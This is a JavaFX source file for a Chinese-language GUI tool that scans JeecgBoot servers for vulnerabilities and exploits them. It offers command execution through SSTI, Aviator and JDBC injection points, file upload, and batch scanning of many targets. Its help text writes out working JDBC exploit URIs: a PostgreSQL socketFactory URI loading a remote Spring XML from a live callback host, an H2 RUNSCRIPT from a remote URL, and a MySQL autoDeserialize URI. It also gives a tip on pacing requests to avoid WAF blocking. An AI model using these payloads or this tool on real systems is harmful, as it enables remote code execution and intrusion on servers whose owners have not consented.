package com.jeescan.ui;

import javafx.beans.property.BooleanProperty;
import javafx.beans.property.SimpleBooleanProperty;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.property.StringProperty;
import javafx.geometry.Insets;
import javafx.geometry.Orientation;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.PasswordField;
import javafx.scene.control.ProgressBar;
import javafx.scene.control.ScrollPane;
import javafx.scene.control.Separator;
import javafx.scene.control.SplitPane;
import javafx.scene.control.Tab;
import javafx.scene.control.TabPane;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.Tooltip;
import javafx.scene.control.cell.CheckBoxTableCell;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.ColumnConstraints;
import javafx.scene.layout.FlowPane;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Priority;
import javafx.scene.layout.Region;
import javafx.scene.layout.VBox;
import javafx.stage.FileChooser;
import javafx.stage.Stage;

/**
 * JavaFX 主界面。
 *
 * 样式要求（严格遵守）：
 *   1. 不设 -fx-font-family / -fx-font-size —— 用 JavaFX 默认字体字号
 *   2. 不设 -fx-border-*                   —— 用 Modena 默认边框（1px 浅灰）
 *   3. 不设 -fx-background-radius / -fx-background-color / 阴影
 *   4. 只用默认白底浅灰，禁止主题色、渐变、深色模式
 *
 * 实现方式：完全不调用 setStyle()，不加载任何外部 CSS 文件，
 * 全部外观由 JavaFX 内置的 Modena（modena.css）提供。
 */
public class MainView {

    private final Stage stage;

    // ===== 顶部配置 =====
    private final TextField targetField = new TextField("http://127.0.0.1:8080/");
    private final TextField prefixField = new TextField();
    private final TextField tokenField = new TextField();
    private final TextField oobField = new TextField();
    private final TextField sleepField = new TextField("0");
    private final TextField timeoutField = new TextField("20");

    private final CheckBox echoBox = new CheckBox("完整回显");
    private final CheckBox sensitiveBox = new CheckBox("敏感操作");

    // ===== 代理 =====
    private final CheckBox proxyEnable = new CheckBox("使用代理");
    private final ComboBox<String> proxyType = new ComboBox<>();
    private final TextField proxyHost = new TextField();
    private final TextField proxyPort = new TextField();
    private final TextField proxyUser = new TextField();
    private final PasswordField proxyPass = new PasswordField();
    private final Button proxyTestBtn = new Button("测试代理");

    private final ComboBox<String> modeBox = new ComboBox<>();
    private final Button scanBtn = new Button("开始检测");
    private final Button stopBtn = new Button("停止");

    private final ProgressBar progress = new ProgressBar(0);
    private final Label statLabel = new Label("就绪");

    // ===== 检测页 =====
    private final TableView<Row> table = new TableView<>();
    private final TextArea logArea = new TextArea();
    private final TextArea echoArea = new TextArea();

    // ===== CmdShell =====
    private final ComboBox<String> cmdPointBox = new ComboBox<>();
    private final TextField cmdInput = new TextField("id");
    private final Button cmdSendBtn = new Button("执行");
    private final TextArea cmdOut = new TextArea();

    // ===== 上传 =====
    private final TextField upPath = new TextField("jmreport/upload");
    private final TextField upName = new TextField("probe.txt");
    private final TextField upField = new TextField("file");
    private final Button upSendBtn = new Button("上传");
    private final TextArea upContent = new TextArea();
    private final TextArea upOut = new TextArea();

    // ===== 批量 =====
    private final TextField batchFile = new TextField();
    private final Button batchPick = new Button("选择文件");
    private final Button batchRun = new Button("开始批量");
    private final TextArea batchOut = new TextArea();

    // ===== JDBC 利用（参考 jeecgBootAttack） =====
    private final ComboBox<String> jdbcDriverBox = new ComboBox<>();
    private final TextField jdbcUri = new TextField();
    private final TextField jdbcUser = new TextField("postgres");
    private final TextField jdbcPass = new TextField("postgres");
    private final Button jdbcExecBtn = new Button("执行");
    private final Button jdbcFillBtn = new Button("填模板");
    private final TextArea jdbcOut = new TextArea();
    private final javafx.scene.control.CheckBox jdbcWebPoc =
            new javafx.scene.control.CheckBox("用网上全字段 POC（含 id/code/dbType/dbName/userName）");

    // 逻辑委托（复用原有 Swing 版逻辑太重，这里直接内联 JavaFX 实现）
    private final javafx.collections.ObservableList<Row> rows =
            javafx.collections.FXCollections.observableArrayList();

    public MainView(Stage stage) {
        this.stage = stage;
        targetField.setPrefWidth(280);
        prefixField.setPrefWidth(160);
        prefixField.setPromptText("二级接口，可空");
        tokenField.setPrefWidth(150);
        tokenField.setPromptText("X-Access-Token");
        oobField.setPrefWidth(200);
        oobField.setPromptText("回连/XML 地址");
        sleepField.setPrefWidth(50);
        timeoutField.setPrefWidth(50);

        // 默认不勾选：只输出 [+] / [-] 单行结果
        echoBox.setSelected(false);
        echoBox.setTooltip(new Tooltip("勾选后才在日志里展开完整 payload 与响应明细"));
        modeBox.getItems().addAll("全选", "仅未授权项", "全不选");
        modeBox.getSelectionModel().selectFirst();
        modeBox.setPrefWidth(110);

        cmdPointBox.getItems().addAll(
                "queryFieldBySql SSTI (#1)",
                "loadTableData SSTI (#3)",
                "qurestSql SSTI (#4)",
                "AviatorScript save/show (#18)",
                "testConnection pgsql socketFactory (#2)");
        cmdPointBox.getSelectionModel().selectFirst();
        cmdPointBox.setPrefWidth(280);

        // JDBC 利用页签：驱动三选一（同 jeecgBootAttack）
        jdbcDriverBox.getItems().addAll(
                "org.postgresql.Driver",
                "com.mysql.jdbc.Driver",
                "org.h2.Driver");
        jdbcDriverBox.getSelectionModel().selectFirst();
        jdbcDriverBox.setPrefWidth(230);
        jdbcUri.setPromptText(
                "jdbc:postgresql://127.0.0.1:5432/x?socketFactory=...&socketFactoryArg=http://YOUR-HOST");
        jdbcUser.setPrefWidth(110);
        jdbcPass.setPrefWidth(110);
        jdbcWebPoc.setSelected(true);

        initTable();
        initAreas();
        initActions();
    }

    public Scene build() {
        BorderPane root = new BorderPane();
        root.setTop(buildTop());
        root.setCenter(buildTabs());
        root.setBottom(buildStatus());
        BorderPane.setMargin(root.getTop(), new Insets(8, 8, 4, 8));
        BorderPane.setMargin(root.getCenter(), new Insets(0, 8, 0, 8));
        BorderPane.setMargin(root.getBottom(), new Insets(4, 8, 8, 8));

        // 不设置任何 style / stylesheet —— 外观完全交给 Modena
        Scene scene = new Scene(root, 1400, 880);
        return scene;
    }

    // ============================================================ 顶部

    private VBox buildTop() {
        GridPane g1 = new GridPane();
        g1.setHgap(6);
        g1.setVgap(5);

        // 行 0：目标 / 二级接口 / Token
        g1.add(new Label("目标:"), 0, 0);
        g1.add(targetField, 1, 0);
        g1.add(new Label("二级接口:"), 2, 0);
        g1.add(prefixField, 3, 0);
        g1.add(new Label("Token:"), 4, 0);
        g1.add(tokenField, 5, 0);

        // 行 1：回连地址 / 间隔 / 超时
        g1.add(new Label("回连地址:"), 0, 1);
        g1.add(oobField, 1, 1);
        g1.add(new Label("间隔(s):"), 2, 1);
        g1.add(sleepField, 3, 1);
        g1.add(new Label("超时(s):"), 4, 1);
        g1.add(timeoutField, 5, 1);

        // 行 2：代理配置
        proxyType.getItems().addAll("HTTP", "SOCKS");
        proxyType.getSelectionModel().selectFirst();
        proxyType.setPrefWidth(90);
        proxyHost.setPromptText("127.0.0.1");
        proxyPort.setPromptText("8080");
        proxyUser.setPromptText("用户名");
        proxyPass.setPromptText("密码");
        proxyHost.setPrefWidth(130);
        proxyPort.setPrefWidth(70);
        proxyUser.setPrefWidth(95);
        proxyPass.setPrefWidth(95);
        HBox proxyBox = new HBox(5, proxyEnable, proxyType, proxyHost,
                proxyPort, proxyUser, proxyPass, proxyTestBtn);
        proxyBox.setAlignment(Pos.CENTER_LEFT);
        g1.add(proxyBox, 0, 2, 6, 1);

        // 列宽：让输入框随窗口拉伸，标签列固定
        ColumnConstraints cLbl1 = fixedCol();
        ColumnConstraints cField1 = growCol();
        ColumnConstraints cLbl2 = fixedCol();
        ColumnConstraints cField2 = growCol();
        ColumnConstraints cLbl3 = fixedCol();
        ColumnConstraints cField3 = growCol();
        g1.getColumnConstraints().addAll(cLbl1, cField1, cLbl2, cField2, cLbl3, cField3);

        // 输入框填满各自列
        grow(targetField);
        grow(prefixField);
        grow(tokenField);
        grow(oobField);
        sleepField.setPrefWidth(60);
        timeoutField.setPrefWidth(60);

        // 按钮条：单行不换行
        HBox bar = new HBox(6, modeBox, echoBox, sensitiveBox,
                scanBtn, stopBtn);
        bar.setAlignment(Pos.CENTER_LEFT);

        Region spacer = new Region();
        HBox.setHgrow(spacer, Priority.ALWAYS);
        HBox line = new HBox(0, bar, spacer, statLabel);
        line.setAlignment(Pos.CENTER_LEFT);

        return new VBox(7, g1, line);
    }

    private static ColumnConstraints fixedCol() {
        ColumnConstraints c = new ColumnConstraints();
        c.setHgrow(Priority.NEVER);
        return c;
    }

    private static ColumnConstraints growCol() {
        ColumnConstraints c = new ColumnConstraints();
        c.setHgrow(Priority.ALWAYS);
        c.setFillWidth(true);
        c.setMinWidth(120);
        return c;
    }

    private static void grow(Region r) {
        r.setMaxWidth(Double.MAX_VALUE);
        HBox.setHgrow(r, Priority.ALWAYS);
    }

    // ============================================================ 页签

    private TabPane buildTabs() {
        TabPane tabs = new TabPane();
        tabs.setTabClosingPolicy(TabPane.TabClosingPolicy.UNAVAILABLE);

        Tab t1 = new Tab("漏洞检测", buildScanTab());
        Tab t2 = new Tab("JDBC 利用", buildJdbcTab());
        Tab t3 = new Tab("CmdShell", buildCmdTab());
        Tab t4 = new Tab("文件上传", buildUploadTab());
        Tab t5 = new Tab("批量检测", buildBatchTab());
        tabs.getTabs().addAll(t1, t2, t3, t4, t5);
        return tabs;
    }

    /**
     * JDBC 利用页签 —— 交互参考 jeecgBootAttack：
     *   选择驱动 → 填 jdbc uri → 点执行 → 看响应 / OOB 回连
     */
    private BorderPane buildJdbcTab() {
        BorderPane p = new BorderPane();
        p.setPadding(new Insets(8));

        HBox row1 = new HBox(6, new javafx.scene.control.Label("驱动:"), jdbcDriverBox,
                new javafx.scene.control.Label("用户:"), jdbcUser,
                new javafx.scene.control.Label("密码:"), jdbcPass,
                jdbcExecBtn, jdbcFillBtn);
        row1.setAlignment(Pos.CENTER_LEFT);

        HBox row2 = new HBox(6, new javafx.scene.control.Label("jdbc uri:"), jdbcUri);
        row2.setAlignment(Pos.CENTER_LEFT);
        HBox.setHgrow(jdbcUri, Priority.ALWAYS);

        HBox row3 = new HBox(6, jdbcWebPoc);
        row3.setAlignment(Pos.CENTER_LEFT);

        VBox top = new VBox(6, row1, row2, row3);

        ScrollPane sc = new ScrollPane(jdbcOut);
        sc.setFitToWidth(true);
        sc.setFitToHeight(true);

        p.setTop(top);
        BorderPane.setMargin(top, new Insets(0, 0, 8, 0));
        p.setCenter(sc);

        jdbcOut.setText(
                "JDBC 利用（参考 jeecgBootAttack）\n" +
                "--------------------------------------------------------------\n" +
                "用法:\n" +
                "  1. 选驱动（pgsql / mysql / h2）\n" +
                "  2. 填 jdbc uri\n" +
                "  3. 点「执行」\n" +
                "  4. 看响应；socketFactory 链需到 YOUR-HOST 看是否回连\n" +
                "\n" +
                "pgsql 示例（直接粘贴到 jdbc uri）:\n" +
                "  jdbc:postgresql://127.0.0.1:5432/x?socketFactory=" +
                "org.springframework.context.support.FileSystemXmlApplicationContext" +
                "&socketFactoryArg=http://d51paxvt.requestrepo.com\n" +
                "\n" +
                "h2 示例:\n" +
                "  jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://YOUR-HOST/h2.sql'\n" +
                "\n" +
                "注意:\n" +
                "  · could not be instantiated 属正常，命令已在强转失败前执行完毕\n" +
                "  · 127.0.0.1:5432 不需要真的开着，反射发生在建连之前\n" +
                "  · 「填模板」按钮会按所选驱动填入对应示例\n");

        jdbcExecBtn.setOnAction(e -> runJdbc());
        jdbcFillBtn.setOnAction(e -> fillJdbcTemplate());
        return p;
    }

    /** 按所选驱动填入示例 URI。 */
    private void fillJdbcTemplate() {
        int i = jdbcDriverBox.getSelectionModel().getSelectedIndex();
        String oob = v_oobPlaceholder();
        if (i == 0) {
            jdbcUri.setText("jdbc:postgresql://127.0.0.1:5432/x?socketFactory="
                    + "org.springframework.context.support.FileSystemXmlApplicationContext"
                    + "&socketFactoryArg=" + oob);
        } else if (i == 1) {
            jdbcUri.setText("jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true"
                    + "&allowLoadLocalInfile=true");
        } else {
            jdbcUri.setText("jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"
                    + oob + "/h2.sql'");
        }
    }

    private String v_oobPlaceholder() {
        String o = oob();
        return (o == null || o.isEmpty()) ? "http://YOUR-HOST/bean.xml" : o;
    }

    private SplitPane buildScanTab() {
        ScrollPane logScroll = new ScrollPane(logArea);
        logScroll.setFitToWidth(true);
        logScroll.setFitToHeight(true);

        ScrollPane echoScroll = new ScrollPane(echoArea);
        echoScroll.setFitToWidth(true);
        echoScroll.setFitToHeight(true);

        TabPane right = new TabPane();
        right.setTabClosingPolicy(TabPane.TabClosingPolicy.UNAVAILABLE);
        right.getTabs().addAll(
                new Tab("运行日志", logScroll),
                new Tab("回显检测", echoScroll));

        SplitPane sp = new SplitPane(table, right);
        sp.setOrientation(Orientation.HORIZONTAL);
        sp.setDividerPositions(0.62);
        return sp;
    }

    private BorderPane buildCmdTab() {
        BorderPane p = new BorderPane();
        p.setPadding(new Insets(8));

        HBox bar = new HBox(6,
                new Label("利用点:"), cmdPointBox,
                new Label("命令:"), cmdInput, cmdSendBtn);
        bar.setAlignment(Pos.CENTER_LEFT);
        HBox.setHgrow(cmdInput, Priority.ALWAYS);

        ScrollPane sc = new ScrollPane(cmdOut);
        sc.setFitToWidth(true);
        sc.setFitToHeight(true);

        p.setTop(bar);
        BorderPane.setMargin(bar, new Insets(0, 0, 8, 0));
        p.setCenter(sc);

        cmdOut.setText(
                "说明:\n" +
                "--------------------------------------------------------------\n" +
                "1. 先在「漏洞检测」确认 #1 / #3 / #4 / #18 / #2 中至少一项为「存在」。\n" +
                "2. 选择对应利用点，填命令后点「执行」。\n" +
                "3. #1/#3/#4 FreeMarker 是同步回显，结果直接显示在下方。\n" +
                "4. #2 testConnection 需先在顶部填「回连地址」，命令输出通过 XML 外带回来。\n" +
                "   返回 could not be instantiated 属正常，命令已在强转失败前执行完毕。\n" +
                "5. #18 Aviator 在本类目标上通常禁实例方法，exec 可能不可用。\n");
        return p;
    }

    private BorderPane buildUploadTab() {
        BorderPane p = new BorderPane();
        p.setPadding(new Insets(8));

        HBox bar = new HBox(6,
                new Label("上传接口:"), upPath,
                new Label("文件名:"), upName,
                new Label("字段名:"), upField, upSendBtn);
        bar.setAlignment(Pos.CENTER_LEFT);
        upPath.setPrefWidth(180);
        upName.setPrefWidth(120);
        upField.setPrefWidth(90);

        ScrollPane contentScroll = new ScrollPane(upContent);
        contentScroll.setFitToWidth(true);
        contentScroll.setFitToHeight(true);

        ScrollPane outScroll = new ScrollPane(upOut);
        outScroll.setFitToWidth(true);
        outScroll.setFitToHeight(true);

        SplitPane sp = new SplitPane(contentScroll, outScroll);
        sp.setOrientation(Orientation.VERTICAL);
        sp.setDividerPositions(0.62);

        p.setTop(bar);
        BorderPane.setMargin(bar, new Insets(0, 0, 8, 0));
        p.setCenter(sp);

        upContent.setText("-- 在此粘贴要上传的文件内容 --\n"
                + "jscan-probe-" + System.currentTimeMillis() + "\n");
        return p;
    }

    private BorderPane buildBatchTab() {
        BorderPane p = new BorderPane();
        p.setPadding(new Insets(8));

        HBox bar = new HBox(6,
                new Label("URL 列表:"), batchFile, batchPick, batchRun);
        bar.setAlignment(Pos.CENTER_LEFT);
        HBox.setHgrow(batchFile, Priority.ALWAYS);

        ScrollPane sc = new ScrollPane(batchOut);
        sc.setFitToWidth(true);
        sc.setFitToHeight(true);

        p.setTop(bar);
        BorderPane.setMargin(bar, new Insets(0, 0, 8, 0));
        p.setCenter(sc);

        batchOut.setText("批量检测说明\n"
                + "--------------------------------------------------------------\n"
                + "1. 准备 urls.txt，每行一个目标根地址：\n"
                + "     http://1.1.1.1:8080/\n"
                + "     http://2.2.2.2/jeecg-boot/\n"
                + "2. 选择文件后点「开始批量」。\n"
                + "3. 用当前勾选的检测项逐个跑，只输出存在漏洞的目标。\n"
                + "4. 上方「二级接口」对所有目标统一生效；前缀不同请分批跑。\n");
        return p;
    }

    private HBox buildStatus() {
        progress.setPrefWidth(200);
        HBox box = new HBox(8, progress);
        box.setAlignment(Pos.CENTER_LEFT);
        return box;
    }

    // ============================================================ 表格

    private void initTable() {
        table.setItems(rows);
        table.setEditable(true);
        table.getSelectionModel().selectedItemProperty().addListener(
                (o, ov, nv) -> showEcho(nv));

        TableColumn<Row, Boolean> c0 = new TableColumn<>("选");
        c0.setCellValueFactory(cd -> cd.getValue().checked);
        c0.setCellFactory(CheckBoxTableCell.forTableColumn(c0));
        c0.setEditable(true);
        c0.setPrefWidth(42);
        c0.setMinWidth(42);
        c0.setMaxWidth(42);
        c0.setResizable(false);
        c0.setSortable(false);

        TableColumn<Row, String> c1 = new TableColumn<>("#");
        c1.setCellValueFactory(cd -> new SimpleStringProperty(cd.getValue().id));
        c1.setPrefWidth(44);
        c1.setMinWidth(44);
        c1.setMaxWidth(44);
        c1.setResizable(false);
        c1.setSortable(false);

        TableColumn<Row, String> c2 = new TableColumn<>("检测项");
        c2.setCellValueFactory(cd -> new SimpleStringProperty(cd.getValue().name));
        c2.setPrefWidth(230);
        c2.setMinWidth(200);

        TableColumn<Row, String> c3 = new TableColumn<>("等级");
        c3.setCellValueFactory(cd -> new SimpleStringProperty(cd.getValue().severity));
        c3.setPrefWidth(72);
        c3.setMinWidth(72);
        c3.setSortable(false);

        TableColumn<Row, String> c4 = new TableColumn<>("认证");
        c4.setCellValueFactory(cd -> new SimpleStringProperty(
                cd.getValue().needsAuth ? "需Token" : "未授权"));
        c4.setPrefWidth(68);
        c4.setMinWidth(68);
        c4.setSortable(false);

        TableColumn<Row, String> c5 = new TableColumn<>("端点");
        c5.setCellValueFactory(cd -> new SimpleStringProperty(cd.getValue().endpoint));
        c5.setPrefWidth(260);
        c5.setMinWidth(220);

        TableColumn<Row, String> c6 = new TableColumn<>("结果");
        c6.setCellValueFactory(cd -> cd.getValue().resultText);
        c6.setPrefWidth(220);
        c6.setMinWidth(160);

        table.getColumns().addAll(c0, c1, c2, c3, c4, c5, c6);

        // 关键：不用 CONSTRAINED_RESIZE_POLICY（它会平均分配导致内容截断），
        // 改为固定列宽 + 横向滚动条，内容完整可读。
        table.setColumnResizePolicy(TableView.UNCONSTRAINED_RESIZE_POLICY);

        // 单元格悬停显示完整文本
        table.setRowFactory(tv -> {
            javafx.scene.control.TableRow<Row> row = new javafx.scene.control.TableRow<>();
            row.setOnMouseClicked(e -> {
                if (e.getClickCount() == 1 && !row.isEmpty()) showEcho(row.getItem());
            });
            return row;
        });

        // 填充 26 项
        for (com.jeescan.core.Detector d : com.jeescan.core.Registry.all()) {
            rows.add(new Row(d));
        }
    }

    private void initAreas() {
        logArea.setEditable(false);
        logArea.setWrapText(false);
        echoArea.setEditable(false);
        echoArea.setWrapText(false);
        cmdOut.setEditable(false);
        cmdOut.setWrapText(false);
        upOut.setEditable(false);
        upOut.setWrapText(false);
        batchOut.setEditable(false);
        batchOut.setWrapText(false);
    }

    private void initActions() {
        modeBox.setOnAction(e -> applyMode());

        scanBtn.setOnAction(e -> runScan(false));
        stopBtn.setOnAction(e -> {
            if (engine != null) engine.stop();
            log("[!] 已请求停止...");
        });

        cmdSendBtn.setOnAction(e -> runCmd());
        upSendBtn.setOnAction(e -> doUpload());
        batchPick.setOnAction(e -> pickBatchFile());
        batchRun.setOnAction(e -> runBatch());
        proxyTestBtn.setOnAction(e -> new Controller(this).testProxy());

        log("jeecgboot-tiplus 漏洞检测 by dollmarker v1.0");
        log("已就绪。");
        log("接口需手动填（jeecg-boot / api / prod-api / 留空），工具不自动补前缀。");
        log("有 WAF 时把「间隔」设为 6 秒，否则连续请求会被封 IP。");
        log("默认只输出 [+] 有漏洞 / [-] 无漏洞；勾选「完整回显」才展开 payload 与响应。");
    }

    private void applyMode() {
        int m = modeBox.getSelectionModel().getSelectedIndex();
        for (Row r : rows) {
            if (m == 0) r.checked.set(true);
            else if (m == 1) r.checked.set(!r.needsAuth);
            else r.checked.set(false);
        }
    }

    // ============================================================ 数据模型

    /** 表格一行。 */
    public static final class Row {
        final String id;
        final String name;
        final String severity;
        final String endpoint;
        final boolean needsAuth;
        final com.jeescan.core.Detector detector;

        final BooleanProperty checked = new SimpleBooleanProperty(true);
        final StringProperty resultText = new SimpleStringProperty("");
        com.jeescan.core.Result result;

        Row(com.jeescan.core.Detector d) {
            this.detector = d;
            this.id = d.getId();
            this.name = d.getName();
            this.severity = d.getSeverity();
            this.endpoint = d.getEndpoint();
            this.needsAuth = d.requiresToken();
        }
    }

    // 占位：实际扫描/命令/上传/批量逻辑放在 Controller 里，避免本类过长
    private com.jeescan.core.Engine engine;

    void log(String s) {
        logArea.appendText(s + "\n");
    }

    void showEcho(Row r) {
        if (r == null) return;
        if (r.result == null) {
            echoArea.setText("#" + r.id + "  " + r.name + "\n\n尚未执行。\n\n端点: "
                    + r.endpoint + "\n判定依据: " + r.detector.getNote() + "\n");
        } else {
            echoArea.setText(r.result.dump());
        }
    }

    // ---- 以下方法由 Controller 调用 ----

    public void runScan(boolean dummy) { new Controller(this).scan(); }
    public void runCmd()               { new Controller(this).execCmd(); }
    public void doUpload()             { new Controller(this).upload(); }
    public void runBatch()             { new Controller(this).batch(); }
    public void runJdbc()              { new Controller(this).jdbc(); }

    // ---- JDBC 利用页签 getter ----

    public String jdbcDriver()  { return String.valueOf(jdbcDriverBox.getSelectionModel().getSelectedItem()); }
    public String jdbcUriText() { return jdbcUri.getText().trim(); }
    public String jdbcUserText() { return jdbcUser.getText().trim(); }
    public String jdbcPassText() { return jdbcPass.getText().trim(); }
    public boolean jdbcWebPocOn() { return jdbcWebPoc.isSelected(); }
    public TextArea jdbcOut()   { return jdbcOut; }
    public void jdbcExecEnable(boolean b) { jdbcExecBtn.setDisable(!b); }

    void pickBatchFile() {
        FileChooser fc = new FileChooser();
        fc.setTitle("选择 urls.txt");
        java.io.File f = fc.showOpenDialog(stage);
        if (f != null) batchFile.setText(f.getAbsolutePath());
    }

    // ---- getter（供 Controller 读取 UI 状态）----

    public Stage stage()               { return stage; }
    public String target()             { return targetField.getText().trim(); }
    public String prefix()             { return prefixField.getText().trim(); }
    public String token()              { return tokenField.getText().trim(); }
    public String oob()                { return oobField.getText().trim(); }
    public String cmdText()            { return cmdInput.getText().trim(); }
    public int sleepSec()              { return toInt(sleepField.getText(), 0); }
    public int timeoutSec()            { return toInt(timeoutField.getText(), 20); }
    public boolean echoOn()            { return echoBox.isSelected(); }
    public boolean sensitiveOn()       { return sensitiveBox.isSelected(); }

    // ---- 代理 getter ----
    public boolean proxyOn()           { return proxyEnable.isSelected(); }
    public String proxyTypeText()      { return String.valueOf(proxyType.getSelectionModel().getSelectedItem()); }
    public String proxyHostText()      { return proxyHost.getText().trim(); }
    public String proxyPortText()      { return proxyPort.getText().trim(); }
    public String proxyUserText()      { return proxyUser.getText().trim(); }
    public String proxyPassText()      { return proxyPass.getText(); }
    public Button proxyTestBtn()       { return proxyTestBtn; }
    public String upPathText()         { return upPath.getText().trim(); }
    public String upNameText()         { return upName.getText().trim(); }
    public String upFieldText()        { return upField.getText().trim(); }
    public String upContentText()      { return upContent.getText(); }
    public String batchFileText()      { return batchFile.getText().trim(); }
    public int cmdPointIndex()         { return cmdPointBox.getSelectionModel().getSelectedIndex(); }

    public TableView<Row> table()      { return table; }
    public javafx.collections.ObservableList<Row> rows() { return rows; }
    public TextArea logArea()          { return logArea; }
    public TextArea echoArea()         { return echoArea; }
    public TextArea cmdOut()           { return cmdOut; }
    public TextArea upOut()            { return upOut; }
    public TextArea batchOut()         { return batchOut; }
    public ProgressBar progress()      { return progress; }
    public Label statLabel()           { return statLabel; }
    public Button scanBtn()            { return scanBtn; }
    public Button stopBtn()            { return stopBtn; }
    public void cmdSendBtnDisable(boolean b) { cmdSendBtn.setDisable(b); }
    public void setEngine(com.jeescan.core.Engine e) { this.engine = e; }

    static int toInt(String s, int def) {
        try { return Integer.parseInt(s.trim()); }
        catch (Exception e) { return def; }
    }
}
